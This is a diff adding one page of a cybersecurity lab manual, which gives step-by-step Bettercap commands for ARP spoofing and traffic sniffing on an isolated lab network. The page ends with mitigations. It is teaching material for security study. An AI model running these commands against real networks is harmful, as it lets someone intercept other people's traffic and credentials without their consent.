@@ -1,0 +1,22 @@
+                                                                                               Cyber Security Practical Lab Manual
+
+Practical No. 30
+
+ARP Spoofing Attack Using Bettercap
+Aim: To perform an ARP spoofing attack on a LAN to intercept a victim's traffic using Bettercap.
+Tools / Requirements: Kali Linux, Bettercap, isolated lab network with attacker and victim VMs
+Procedure:
+  1.   Launch Bettercap on the chosen interface: sudo bettercap -iface eth0
+  2.   Discover hosts on the network: net.probe on then net.show
+  3.   Set the spoof target: set arp.spoof.targets <victim-ip>
+  4.   Start spoofing: arp.spoof on
+  5.   Start sniffing traffic: net.sniff on
+  6.   Observe captured packets/credentials in the Bettercap log, confirming the attacker is now the man-in-the-middle.
+  7.   Stop with arp.spoof off and net.sniff off when finished; discuss mitigation (dynamic ARP inspection, static ARP, port
+       security).
+
+
+
+
+                                                                 32
+
